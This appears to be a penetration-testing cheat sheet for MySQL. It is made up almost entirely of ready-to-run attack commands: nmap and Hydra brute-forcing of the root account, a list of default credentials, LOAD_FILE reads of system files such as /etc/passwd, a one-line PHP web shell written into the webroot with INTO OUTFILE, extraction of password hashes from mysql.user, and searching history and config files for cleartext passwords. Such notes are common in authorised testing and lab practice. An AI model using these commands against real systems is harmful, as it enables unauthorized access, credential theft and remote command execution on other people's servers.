# MySQL
```table-of-contents
```
## Discovery & Enumeration
```shell
# Nmap - Discovery & Brute Force Check
# Runs scripts to check for empty passwords, valid users, and vulnerabilities
nmap -p 3306 -sV -sC --script="mysql*" <IP>

# Banner Grabbing (Netcat)
nc -nv <IP> 3306
```
## Authentication & Brute Force
### Manual Connection
```shell
# Standard Connection
# -u: User | -h: Host | -p: Prompt for password (no space if providing it directly)
mysql -u root -h <IP> -p

# Default Credentials to Try
# root : <empty>
# root : root
# admin : admin
# guest : guest
```
### Hydra (Brute Force)
```shell
# Brute Force 'root' user
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://<IP>
```
## SQL Command Reference
| **Command**              | **Description**                      |
| ------------------------ | ------------------------------------ |
| `SHOW DATABASES;`        | List all databases.                  |
| `USE <database>;`        | Switch to a specific database.       |
| `SHOW TABLES;`           | List tables in the current database. |
| `DESCRIBE <table>;`      | Show columns and types of a table.   |
| `SELECT * FROM <table>;` | Dump all data from a table.          |
| `SELECT version();`      | Display the MySQL version.           |
| `SELECT user();`         | Display current user.                |
## Attacks & Exploitation
### 1. Reading System Files (LFI)
_Requires `FILE` privileges._
```sql
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('c:/windows/win.ini');
```
### 2. Writing Files (WebShell / RCE)
_Requires `FILE` privileges AND `secure_file_priv` to be empty._
```sql
-- Check if we can write files (Must be empty or contain the target path)
SHOW VARIABLES LIKE 'secure_file_priv';

-- Write a PHP WebShell to the webroot
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
```
### 3. Dumping Hashes
_Extract password hashes to crack them locally (Hashcat mode 300)._
```sql
-- MySQL 5.7+
SELECT user, authentication_string FROM mysql.user;

-- Older Versions
SELECT user, password FROM mysql.user;
```
## Post-Exploitation (Local)
```shell
# Read Configuration (Find passwords/paths)
cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#"
cat /etc/mysql/my.cnf

# History File (CRITICAL: Often contains cleartext passwords typed by admins)
cat ~/.mysql_history
grep -i "pass" ~/.mysql_history

# Check secure_file_priv setting
mysql -u root -e 'SHOW VARIABLES LIKE "secure_file_priv";'
```